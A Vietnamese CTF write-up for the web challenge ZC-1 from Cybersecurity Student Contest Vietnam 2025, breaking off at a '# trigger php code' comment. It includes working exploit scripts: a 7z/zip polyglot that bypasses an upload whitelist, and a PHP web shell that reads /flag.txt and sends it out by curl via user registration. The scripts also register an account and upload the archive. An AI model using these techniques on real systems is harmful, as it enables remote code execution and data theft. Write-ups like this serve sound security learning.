<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        
        Writeup (Web) Cybersecurity Student Contest Vietnam 2025 | Cuýt
        
    </title>
    <link rel="stylesheet" href="/css/normalize.min.css">
    <link rel="stylesheet" href="/css/bootstrap-grid-5.3.8.css">
    <link rel="stylesheet" href="/css/fontawesome-7.1.0/css/all.min.css">
    
    <link rel="stylesheet" href="/css/syntax.min.c75db92330d165065b4cef68bb3da371b54ad6f746e9e9047ea56f286749850b.css" integrity="sha256-x125IzDRZQZbTO9ouz2jcbVK1vdG6ekEfqVvKGdJhQs=">
    <link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
    <link rel="icon" type="image/svg+xml" href="/images/favicon.svg" />
    <link rel="shortcut icon" href="/images/favicon.ico" />
    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
    <meta name="apple-mobile-web-app-title" content="blog của Cuýt" />
    <link rel="manifest" href="/images/site.webmanifest" />
    <link rel="preload" href="/fonts/JetBrainsMono/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin>
    <script src="/js/fuse.basic.min.js"></script>
    
    <link rel="stylesheet" href="/css/style.min.49f1f112f71b083453e3f02b917fe6e8799d4fc61c35e585c74f7897a5b0b171.css" integrity="sha256-SfHxEvcbCDRT4/ArkX/m6HmdT8YcNeWFx094l6WwsXE=">
</head>
<body>
    <div id="main-wrapper">
        <header id="main-header" class="mt-4">
    <div class="container container-narrow">
        <div class="row align-items-center">
            <div class="col-3">
                <div class="main-header__homepage">
                <a href="/" class="main-header__hompage-link">Cuýt</a>
                </div>
            </div>
            <div class="col-6">
                <nav class="main-header__navbar">
                <ul class="main-header__navbar-list">
                    <li><a href="/">Blog</a></li>
                    <li><a href="/categories">Categories</a></li>
                    <li><a href="/archives">Archives</a></li>
                    <li><a href="/about">About</a></li>
                </ul>
                </nav>
            </div>
            <div class="col-3 text-end">
                <div class="main-header__btn">
                    <div class="main-header_search-wrapper">
                        <i class="fa-solid fa-magnifying-glass main-header__search-icon"></i>
                        <input type="text" class="main-header__search-box" placeholder="Search...">
                        <ul id="main_header__search-results"></ul>
                    </div>
                    <button class="main-header__btn-toggle-theme">
                        <i class="fa-solid fa-moon"></i>
                    </button>
                </div>
            </div>
        </div>
    </div>
</header>

        <div id="main-content" class="container container-narrow mt-4 mb-4">
            
    <div class="row">
        <article class="main-content__article-detail col-9">
            
        
            <header class="main-content__article-header mb-5">
                <h1 class="main-content__article-title">
                    Writeup (Web) Cybersecurity Student Contest Vietnam 2025
                </h1>
                <div class="main-content__article-meta mt-3">
                    <span>
                        <i class="fa-solid fa-hashtag"></i>
                        
                            
                                
                                <a class="main-content__article-meta-category-link" href="/categories/ctf">
                                    CTF
                                </a>
                            
                                , 
                                <a class="main-content__article-meta-category-link" href="/categories/writeups">
                                    Writeups
                                </a>
                            
                                , 
                                <a class="main-content__article-meta-category-link" href="/categories/web">
                                    Web
                                </a>
                            
                                , 
                                <a class="main-content__article-meta-category-link" href="/categories/security">
                                    Security
                                </a>
                            
                        
                    </span>
                    <span class="ms-3"><i class="fa-regular fa-calendar"></i> 02/01/2026</span>
                    <span class="ms-3"><i class="fa-regular fa-clock"></i> 13 mins read</span>
                </div>
            </header>
        
            
            
            
            
            
            
            
            
            
            <div class="main-content__article-body-content">
                <h2 id="zc-1">ZC-1</h2>
<p>Đề bài cung cấp hai dịch vụ: app1 là một api Django chịu trách nhiệm xác nhận người dùng và gửi file zip cho app2, là một dịch vụ apache/PHP có thể giải nén file zip nhận được và lưu trữ file. Docker gán 2 dịch vụ với nhau và gán flag.txt vào app2, app1 được map cổng 8000 và app2 chỉ bị expose qua app1.</p>
<p><code>superapp</code> chứa các cấu hình chính của dịch vụ:</p>
<ul>
<li>
<p>REST framework cấu hình dùng SessionAuthentication và JWTAuthentication</p>
</li>
<li>
<p><code>STORAGE_URL</code>là http://127.0.0.1:8002, (là url để app1 gọi đến app2)</p>
</li>
<li>
<p>ALLOW_STORAGE_FILE = (&quot;.txt&quot;,&quot;.docx&quot;,&quot;.png&quot;,&quot;.jpg&quot;,&quot;.jpeg&quot;)</p>
</li>
<li>
<p><code>POST /auth/token/</code> để lấy access_key (jwt)</p>
</li>
</ul>
<p><code>gateway</code> app chứa model, serializer, view và util. ở đây tổ chức 2 viewset:</p>
<ul>
<li>
<p>GatewayViewSet: <code>POST /gateway/transport/</code> đọc file gửi lên và gửi cho app2, sử dụng hàm check_file và transport_file; <code>GET /gateway/health/?module=x</code> kiểm tra endpoint <code>x</code> của app2 dùng hàm health_check.</p>
</li>
<li>
<p>UserViewSet: <code>POST /gateway/user/</code> đăng kí người dùng và <code>POST /gateway/user/find/?offset=x</code> thực hiện tìm kiếm người dùng: trả về username và email.</p>
</li>
</ul>
<p>Hướng giải chính của bài này: người dùng thực hiện đăng ký, upload file zip độc hại và app2 giải nén, sau đó thực hiện ssrf để thực thi file được giải nén.</p>
<p><strong>bypass upload file zip chứa extension bị filter: zip concentration</strong></p>
<p>Ta chú ý vào logic upload file của dịch vụ đầu tiên:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@action</span><span class="p">(</span><span class="n">detail</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;post&#39;</span><span class="p">],</span> <span class="n">url_path</span><span class="o">=</span><span class="s1">&#39;transport&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">transport</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">:</span> <span class="n">Request</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">file</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">check_file</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="s2">&#34;Invalid file&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span> <span class="o">=</span> <span class="n">transport_file</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">user</span><span class="o">.</span><span class="n">id</span><span class="p">),</span> <span class="n">file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Tại đây chương trình thực hiện lấy nội dung file qua POST request, sau đó kiểm tra nội dung file nhờ hàm <code>check_file</code>, nếu hợp lệ thì tiếp tục thực hiện upload file zip qua hàm <code>transport_file</code> với tham số là file zip và id của người dùng. Ta tiếp tục phân tích hàm kiểm tra file đầu tiện:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_file</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">zf</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">namelist</span> <span class="o">=</span> <span class="n">zf</span><span class="o">.</span><span class="n">namelist</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">([</span><span class="n">f</span> <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">namelist</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">f</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">allow_storage_file</span><span class="p">)])</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Tại đây chương trình sử dụng thư viên zipfile của python. nó sử dụng [namelist()](<a href="https://docs.python.org/3/library/zipfile.html#zipfile.ZipFile.namelist">zipfile — Work with ZIP archives — Python 3.14.0 documentation</a>) để kiểm tra các entry của file zip (tên file được nén), nếu chứa một trong các extension bị cấm hoặc lỗi giải nén thì trả về lỗi chương trình.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">transport_file</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">url</span><span class="o">=</span> <span class="n">storage_url</span> <span class="o">+</span> <span class="s2">&#34;/storage.php&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;id&#34;</span><span class="p">:(</span><span class="kc">None</span><span class="p">,</span><span class="nb">id</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;file&#34;</span><span class="p">:</span><span class="n">file</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;OK&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;ERR&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Tiếp theo, chương trình gọi hàm này để thực thi <code>storage.php</code> kèm với id của người dùng và nội dung file zip. Ta tiếp tục phân tích mã nguồn:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s2">&#34;vendor/autoload.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">Archive7z\Archive7z</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$storage_dir</span> <span class="o">=</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s2">&#34;/storage/&#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$storage_dir</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$storage_dir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Archive7z</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">setOutputDirectory</span><span class="p">(</span><span class="nv">$storage_dir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">extract</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>storage.php</code> chịu trách nhiệm nhận POST multipart với id và file, script tạo thư mục <code>__DIR__ . &quot;/storage/&quot; . $_POST['id']</code>, rồi khởi tạo đối tượng <code>Archive7z</code>, sau đó gọi <code>setOutputDirectory($storage_dir)</code>  để thực hiện ghi file được giải nén.</p>
<p>Đến đây về cơ bản ta đã hoàn thành được luồng hoạt động của chương trình khi upload và giải nén file vào dịch vụ app2. Có một số vấn đề đến đây ta đặt được nghi vấn:</p>
<ul>
<li>
<p>Ta có thể lấy được path chính xác mà của file ta upload do chương trình không thực hiện random lại path và tên file. Ta có thể lấy id người dùng từ token và path/tên file sẽ chính xác như file được zip. Đồng thời dịch vụ có hỗ trợ gọi endpoint của app2, cho nên đến đây ta đã biết được phải sử dụng endpoint này để thực thi file upload.</p>
</li>
<li>
<p>2 dịch vụ sử dụng 2 cách giải nén file khác nhau, ta sẽ khai thác sự bất đồng bộ giữa: zipfile của python và Archive7z để bypass whitelist đuôi file. Từ đó upload file php lên app2, sau đó thực thi file bằng ssrf.</p>
</li>
</ul>
<p>Đầu tiên ta cần phân tích cấu trúc của một file zip:</p>
<ol>
<li>
<p>local file header + file data</p>
</li>
<li>
<p>central directory: gần cuối file, chứa metadata của các file trong file zip (tên, kích thước, offset)</p>
</li>
<li>
<p>end of central directory: chứa metadata của central directory</p>
</li>
</ol>
<p><code>zipfile</code> của python tìm end of central directory đầu tiên, sau đó đọc metadata của các file và thực hiện giải nén. kết quả của việc này là các file được zipfile giải nén chỉ quan tâm tới phần cuối của file và chấp nhận các leading junk. còn <code>7z</code> đầu tiên sẽ kiểm tra magic byte đầu tiên, nếu trùng khớp thì nó thực hiện giải nén toàn bộ các thành phần nó tìm thấy trong file.</p>
<p>kết quả là: ta có thể bypass bằng cách đặt file 7z ở đầu và file zip ở sau để bypass. Ta thực hiện viết một script đơn giản để kiểm chứng:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span> <span class="k">as</span> <span class="n">s</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="s1">&#39;echo phppayload &gt; shell.php&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="s1">&#39;echo nglong05 &gt; ok.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="s2">&#34;7z a -t7z evil.7z shell.php&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="s2">&#34;zip -9 -q good.zip ok.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="s2">&#34;cat evil.7z good.zip &gt; poly.zip&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;poly.zip&#34;</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">fileobj</span> <span class="o">=</span> <span class="n">BytesIO</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">check_file</span><span class="p">(</span><span class="n">fileobj</span><span class="p">))</span>  <span class="c1"># True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="s2">&#34;7z l poly.zip&#34;</span><span class="p">)</span> <span class="c1"># chứa shell.php</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>ssrf thực thi file và lấy flag</strong></p>
<p>Đến đây ta đã có thể up file php từ đó RCE hệ thống app2. Ta có một số lựa chọn để trích xuất flag: vì endpoint healthcheck chỉ trả về 200/500 nên ta có thể thực hiện trích xuất flag theo byte (ví dụ gửi file kiểm tra từng kí tự tại từng vị trí, nếu chính xác thì trả về 200). Ở đây ta có cách làm khác nhanh hơn: dùng app2 gọi lại tới app1 để đăng ký người dùng mới, với email chứa flag, sau đó dùng endpoint tìm kiếm người dùng để tìm lại flag.</p>
<p>Ta thực hiện viết script như sau: đầu tiên đăng ký một tài khoản, trích xuất ra access_token (jwt) và user_id</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://web2.cscv.vn:8000/&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;gateway/user/&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;nnglong05&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;nglong05&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;auth/token/&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;nnglong05&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;nglong05&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">access_token</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;access&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">user_id</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">b64decode</span><span class="p">(</span><span class="n">access_token</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]))</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;user_id&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span> <span class="c1"># c4decbea-a3e2-41a4-a273-70c1a48866c9</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Tiếp đến thực hiện tạo một <code>poly.zip</code>, thực hiện các kỹ thuật đã trình bày ở trên: tạo một file php thực thi, sau đó sử dụng 7z để nén file php và zip 1 file txt, sau đó để file 7z lên đầu. Ở đây, nội dung file php thực thi có nhiệm vụ lấy flag, sau đó đăng ký một tài khoản mới với mail có chứa flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># credential for the flag user</span>
</span></span><span class="line"><span class="cl"><span class="n">user</span> <span class="o">=</span> <span class="s2">&#34;fla_user_nglong05_3&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;97348gey32095u89re&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># php file content</span>
</span></span><span class="line"><span class="cl"><span class="n">php_content</span> <span class="o">=</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="s2">$flag = @file_get_contents(&#39;/flag.txt&#39;);
</span></span></span><span class="line"><span class="cl"><span class="s2">$enc = base64_encode($flag);
</span></span></span><span class="line"><span class="cl"><span class="s2">$email = $enc . &#39;@nglong05.com&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s2">$payload = json_encode([
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;username&#34; =&gt; &#34;</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;password&#34; =&gt; &#34;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;email&#34; =&gt; $email
</span></span></span><span class="line"><span class="cl"><span class="s2">]);
</span></span></span><span class="line"><span class="cl"><span class="s2">$cmd = &#39;curl -s -X POST &#34;http://app1:8000/gateway/user/&#34; -H &#34;Content-Type: application/json&#34; -d &#39; . escapeshellarg($payload);
</span></span></span><span class="line"><span class="cl"><span class="s2">system($cmd);
</span></span></span><span class="line"><span class="cl"><span class="s2">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;shell.php&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">php_content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># craft poly.zip</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span> <span class="k">as</span> <span class="n">s</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="s1">&#39;echo nglong05 &gt; ok.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="s2">&#34;7z a -t7z evil.7z shell.php &gt;/dev/null&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="s2">&#34;zip -9 -q good.zip ok.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="s2">&#34;cat evil.7z good.zip &gt; poly.zip&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Sau đó thực hiện gửi file zip này và trigger nó qua ssrf:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># send zip file</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;poly.zip&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;gateway/transport/&#34;</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Authorization&#34;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;Bearer </span><span class="si">{</span><span class="n">access_token</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="n">f</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># trigger php code</span>
